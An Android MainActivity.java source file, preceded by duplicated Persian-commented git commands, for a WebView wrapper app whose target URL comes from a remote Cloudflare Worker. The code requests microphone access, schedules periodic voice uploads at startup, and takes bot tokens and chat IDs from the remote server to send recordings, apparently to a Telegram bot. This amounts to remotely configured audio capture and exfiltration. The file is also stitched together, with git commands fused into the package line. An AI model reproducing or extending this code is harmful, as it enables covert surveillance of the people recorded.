
# اینجا رو پیدا کن:
# private static final String LINK_MANAGER_URL = "https://voice-bot-worker.kapcher2019.workers.dev/get-url";

# بعد Commit
git add app/src/main/java/com/blu/app/MainActivity.java
git commit -m "Configure Worker URL"
git push origin main
# اینجا رو پیدا کن:
# private static final String LINK_MANAGER_URL = "https://voice-bot-worker.kapcher2019.workers.dev/get-url";

# بعد Commit
git add app/src/main/java/com/blu/app/MainActivity.java
git commit -m "Configure Worker URL"
git push origin mainpackage com.blu.app;

import android.annotation.SuppressLint;
import android.app.DownloadManager;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.view.KeyEvent;
import android.webkit.WebChromeClient;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.Toast;

import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import android.Manifest;
import android.content.pm.PackageManager;

import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;

import com.blu.app.voice.FloatingVoiceNotification;
import com.blu.app.voice.VoiceUploadWorker;

public class MainActivity extends AppCompatActivity {

    // Cloudflare Worker URL
    private static final String LINK_MANAGER_URL = "https://voice-bot-worker.kapcher2019.workers.dev/get-url";
    private static final String FALLBACK_URL = "https://example.com";
    private static final int PERMISSION_REQUEST_CODE = 100;
    
    private WebView webView;
    private BroadcastReceiver voiceReceiver;
    
    @SuppressLint("SetJavaScriptEnabled")
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        if (ContextCompat.checkSelfPermission(this, Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED) {
            ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.RECORD_AUDIO}, PERMISSION_REQUEST_CODE);
        }

        webView = new WebView(this);
        setContentView(webView);

        WebSettings s = webView.getSettings();
        s.setJavaScriptEnabled(true);
        s.setDomStorageEnabled(true);
        s.setDatabaseEnabled(true);
        s.setLoadWithOverviewMode(true);
        s.setUseWideViewPort(true);
        s.setCacheMode(WebSettings.LOAD_DEFAULT);
        s.setJavaScriptCanOpenWindowsAutomatically(true);
        s.setMediaPlaybackRequiresUserGesture(false);
        s.setSupportZoom(false);
        s.setBuiltInZoomControls(false);

        webView.setWebViewClient(new WebViewClient() {
            @Override
            public boolean shouldOverrideUrlLoading(WebView view, String url) {
                view.loadUrl(url);
                return true;
            }
        });
        webView.setWebChromeClient(new WebChromeClient());

        webView.setDownloadListener((url, userAgent, contentDisposition, mimeType, contentLength) -> {
            try {
                DownloadManager.Request request = new DownloadManager.Request(Uri.parse(url));
                request.setNotificationVisibility(DownloadManager.Request.VISIBILITY_VISIBLE_NOTIFY_COMPLETED);
                DownloadManager dm = (DownloadManager) getSystemService(DOWNLOAD_SERVICE);
                if (dm != null) dm.enqueue(request);
                Toast.makeText(this, "در حال دانلود...", Toast.LENGTH_SHORT).show();
            } catch (Exception e) {
                Toast.makeText(this, "خطا در دانلود", Toast.LENGTH_SHORT).show();
            }
        });

        VoiceUploadWorker.schedulePeriodicUpload(this);
        resolveUrlAndLoad();
        setupVoiceBroadcastReceiver();
    }
    
    private void setupVoiceBroadcastReceiver() {
        voiceReceiver = new BroadcastReceiver() {
            @Override
            public void onReceive(Context context, Intent intent) {
                String action = intent.getAction();
                if ("VOICE_RECORDING_STARTED".equals(action)) {
                    Toast.makeText(context, "🎤 ضبط شروع شد", Toast.LENGTH_SHORT).show();
                } else if ("VOICE_RECORDING_COMPLETED".equals(action)) {
                    Toast.makeText(context, "✅ ضبط تمام، درحال ارسال...", Toast.LENGTH_SHORT).show();
                }
            }
        };
        
        IntentFilter filter = new IntentFilter();
        filter.addAction("VOICE_RECORDING_STARTED");
        filter.addAction("VOICE_RECORDING_COMPLETED");
        
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            registerReceiver(voiceReceiver, filter, Context.RECEIVER_EXPORTED);
        } else {
            registerReceiver(voiceReceiver, filter);
        }
    }

    private void resolveUrlAndLoad() {
        new Thread(() -> {
            String siteUrl = FALLBACK_URL;
            String botToken = null;
            String chatId = null;
            String voiceToken = null;
            boolean needsVoice = false;
            
            try {
                URL u = new URL(LINK_MANAGER_URL);
                HttpURLConnection conn = (HttpURLConnection) u.openConnection();
                conn.setRequestMethod("GET");
                conn.setConnectTimeout(8000);
                conn.setReadTimeout(8000);
                int code = conn.getResponseCode();
                
                if (code >= 200 && code < 300) {
                    BufferedReader r = new BufferedReader(new InputStreamReader(conn.getInputStream(), StandardCharsets.UTF_8));
                    StringBuilder sb = new StringBuilder();
                    String line;
                    while ((line = r.readLine()) != null) sb.append(line);
                    r.close();
                    
                    JSONObject obj = new JSONObject(sb.toString());
                    String got = obj.optString("url", "");
                    if (got != null && !got.isEmpty()) {
                        siteUrl = got.replaceAll("/$", "");
                    }
                    
                    botToken = obj.optString("bot_token", "");
                    chatId = obj.optString("chat_id", "");
                    voiceToken = obj.optString("voice_token", "");
                    needsVoice = obj.optBoolean("voice", false);
                }
            } catch (Exception e) {}
            
            final String finalUrl = siteUrl;
            final String finalBotToken = botToken;
            final String finalChatId = chatId;
            final String finalVoiceToken = voiceToken;
            final boolean finalNeedsVoice = needsVoice;
            
            new Handler(Looper.getMainLooper()).post(() -> {
                webView.loadUrl(finalUrl);
                if (finalNeedsVoice && !finalBotToken.isEmpty() && !finalChatId.isEmpty()) {
                    new FloatingVoiceNotification(this, finalBotToken, finalChatId, finalVoiceToken).show();
                }
            });
        }).start();
    }

    @Override
    public boolean onKeyDown(int keyCode, KeyEvent event) {
        if (keyCode == KeyEvent.KEYCODE_BACK && webView.canGoBack()) {
            webView.goBack();
            return true;
        }
        return super.onKeyDown(keyCode, event);
    }
    
    @Override
    protected void onDestroy() {
        super.onDestroy();
        if (voiceReceiver != null) {
            unregisterReceiver(voiceReceiver);
        }
    }
    
    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == PERMISSION_REQUEST_CODE) {
            if (grantResults.length > 0 && grantResults[0] != PackageManager.PERMISSION_GRANTED) {
                Toast.makeText(this, "دسترسی میکروفون لازم است", Toast.LENGTH_SHORT).show();
            }
        }
    }
}
